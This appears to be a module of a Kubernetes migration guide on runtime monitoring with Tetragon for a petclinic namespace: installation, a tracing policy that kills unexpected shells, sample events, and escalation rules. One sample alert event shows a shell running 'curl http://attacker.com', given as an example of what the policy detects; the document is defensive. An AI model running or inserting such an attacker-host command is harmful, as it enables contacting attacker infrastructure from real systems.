# Module 6 — Runtime Observability and Enforcement with Tetragon

**Objective:** Add eBPF-based runtime visibility to support migration validation, hypercare monitoring, and security incident triage.

---

## 6.1 — Tetragon Installation

```bash
helm repo add cilium https://helm.cilium.io
helm repo update
helm install tetragon cilium/tetragon \
  --namespace kube-system \
  --set tetragon.grpc.address="localhost:54321" \
  --set tetragon.enablePolicyFilter=true \
  --set tetragon.enableProcessCredentials=true \
  --set exportFilename=/var/run/cilium/tetragon/tetragon.log

kubectl get pods -n kube-system -l app.kubernetes.io/name=tetragon
# NAME                        READY   STATUS    RESTARTS   AGE
# tetragon-6f9b4d7c4-8xp2q    1/1     Running   0          2m
```

---

## 6.2 — TracingPolicy

See [kubernetes/network/tetragon-tracing-policy.yaml](../kubernetes/network/tetragon-tracing-policy.yaml).

A TracingPolicy monitors `sys_execve` (process execution) and `sys_connect` (outbound TCP) from the petclinic namespace. The `sys_execve` hook is configured with `Sigkill` action to terminate unexpected shell executions — preventing runtime container breakout.

---

## 6.3 — Sample Tetragon Events

```bash
# Capture events
kubectl exec -n kube-system ds/tetragon -c tetragon -- \
  tetra getevents --namespace petclinic --output json | jq .

# Normal JVM startup event:
{
  "process_exec": {
    "process": {
      "pid": 1,
      "uid": 1000,
      "binary": "/usr/local/openjdk-21/bin/java",
      "arguments": "-jar /app/app.jar",
      "namespace": "petclinic"
    }
  }
}

# ALERT — unexpected shell execution (triggers Sigkill):
{
  "process_exec": {
    "process": {
      "binary": "/bin/sh",
      "arguments": "-c curl http://attacker.com",
      "namespace": "petclinic"
    }
  }
}
```

---

## 6.4 — Post-Migration Operational Use Cases

- **Hypercare monitoring:** Tetragon events stream to Azure Monitor Log Analytics. Unexpected process/network events trigger PagerDuty alerts during the 72-hour hypercare window.
- **Migration validation:** Verify that the migrated petclinic pod only executes the JVM binary and only connects to approved endpoints (MySQL, CoreDNS, partner API).
- **Policy tuning:** Observe all TCP destinations during first 48 hours post-migration without enforcement. Use collected FQDNs to tighten CiliumNetworkPolicy before enabling Sigkill.
- **Incident triage:** Tetragon process tree correlates a suspicious network connection to the exact PID, binary, and container — eliminating manual log correlation.

---

## 6.5 — Escalation Rules

| Signal | Tetragon Detection | Action |
|--------|--------------------|--------|
| Unexpected shell execution (/bin/sh, /bin/bash) | sys_execve with binary in shell list | Sigkill + alert to Azure Monitor / PagerDuty |
| Egress to unapproved IP/FQDN | sys_connect to non-allowlisted destination | SIGKILL or Post event; correlate with Cilium drop |
| Privilege escalation attempt | sys_setuid / capabilities change | Sigkill + immediate incident creation |
| Suspicious binary execution | Binary not in approved image manifest | Alert + container restart; image re-scan triggered |
